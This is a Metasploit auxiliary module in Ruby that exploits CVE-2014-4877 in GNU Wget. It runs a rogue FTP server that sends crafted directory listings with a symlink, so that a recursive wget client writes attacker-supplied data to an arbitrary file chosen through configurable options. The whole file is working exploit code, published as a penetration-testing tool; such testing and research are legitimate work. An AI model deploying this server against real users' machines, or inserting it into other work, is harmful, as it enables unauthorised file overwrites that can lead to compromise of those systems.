##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::FtpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'GNU Wget FTP Symlink Arbitrary Filesystem Access',
      'Description'    => %q{
        This module exploits a vulnerability in Wget when used in
        recursive (-r) mode with a FTP server as a destination. A
        symlink is used to allow arbitrary writes to the target's
        filesystem. To specify content for the file, use the
        "file:/path" syntax for the TARGET_DATA option.

        Tested successfully with wget 1.14. Versions prior to 1.16
        are presumed vulnerable.
      },
      'Author'         => ['hdm'],
      'License'        => MSF_LICENSE,
      'Actions'        => [['Service']],
      'PassiveActions' => ['Service'],
      'References'     =>
        [
          [ 'CVE', '2014-4877'],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1139181' ],
          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2014/10/28/r7-2014-15-gnu-wget-ftp-symlink-arbitrary-filesystem-access' ]
        ],
      'DefaultAction'  => 'Service',
      'DisclosureDate' => 'Oct 27 2014'
    )

    register_options(
      [
        OptString.new('TARGET_FILE', [ true,  "The target file to overwrite", '/tmp/pwned' ]),
        OptString.new('TARGET_DATA', [ true,  "The data to write to the target file", 'Hello from Metasploit' ]),
        OptPort.new('SRVPORT', [ true, "The port for the malicious FTP server to listen on", 2121])
      ])

      @fakedir = Rex::Text.rand_text_alphanumeric(rand(8)+8)
  end

  def run
    my_address = Rex::Socket.source_address
    print_good("Targets should run: $ wget -m ftp://#{my_address}:#{datastore['SRVPORT']}/")
    exploit()
  end

  def on_client_command_user(c,arg)
    @state[c][:user] = arg
    c.put "331 User name okay, need password...\r\n"
  end

  def on_client_command_pass(c,arg)
    @state[c][:pass] = arg
    c.put "230 Login OK\r\n"
    @state[c][:auth] = true
    print_status("#{@state[c][:name]} Logged in with user '#{@state[c][:user]}' and password '#{@state[c][:user]}'...")
  end

  def on_client_command_retr(c,arg)
    print_status("#{@state[c][:name]} -> RETR #{arg}")

    if not @state[c][:auth]
      c.put "500 Access denied\r\n"
      return
    end

    unless arg.index(::File.basename(datastore['TARGET_FILE']))
      c.put "550 File does not exist\r\n"
      return
    end

    conn = establish_data_connection(c)
    if not conn
      c.put("425 Can't build data connection\r\n")
      return
    end

    c.put("150 Opening BINARY mode data connection for #{arg}\r\n")
    conn.put(datastore['TARGET_DATA'])
    c.put("226 Transfer complete.\r\n")
    conn.close

    print_good("#{@state[c][:name]} Hopefully wrote #{datastore['TARGET_DATA'].length} bytes to #{datastore['TARGET_FILE']}")
  end

  def on_client_command_list(c,arg)

    print_status("#{@state[c][:name]} -> LIST #{arg}")

    if not @state[c][:auth]
      c.put "500 Access denied\r\n"
      return
    end

    conn = establish_data_connection(c)
    if not conn
      c.put("425 Can't build data connection\r\n")
      return
    end

    pwd = @state[c][:cwd]
    buf = ''

    dstamp = Time.at(Time.now.to_i-((3600*24*365)+(3600*24*(rand(365)+1)))).strftime("%b %e  %Y")
    unless pwd.index(@fakedir)
      buf << "lrwxrwxrwx   1 root     root           33 #{dstamp} #{@fakedir} -> #{::File.dirname(datastore['TARGET_FILE'])}\r\n"
      buf << "drwxrwxr-x  15 root     root         4096 #{dstamp} #{@fakedir}\r\n"
    else
      buf << "-rwx------   1 root     root    #{"%9d" % datastore['TARGET_DATA'].length} #{dstamp} #{::File.basename(datastore['TARGET_FILE'])}\r\n"
    end

    c.put("150 Opening ASCII mode data connection for /bin/ls\r\n")
    conn.put("total #{buf.length}\r\n" + buf)
    c.put("226 Transfer complete.\r\n")
    conn.close
  end

  def on_client_command_size(c,arg)

    if not @state[c][:auth]
      c.put "500 Access denied\r\n"
      return
    end

    c.put("213 #{datastore['TARGET_DATA'].length}\r\n")
  end


  def on_client_command_cwd(c,arg)

    print_status("#{@state[c][:name]} -> CWD #{arg}")

    if not @state[c][:auth]
      c.put "500 Access denied\r\n"
      return
    end

    upath = "/"
    npath = ::File.join(@state[c][:cwd], arg)
    bpath = npath[upath.length, npath.length - upath.length]

    # Check for traversal above the root directory
    if not (npath[0, upath.length] == upath or bpath == '')
      bpath = '/'
    end

    bpath = '/' if bpath == ''
    @state[c][:cwd] = bpath

    c.put "250 CWD command successful.\r\n"
  end
end
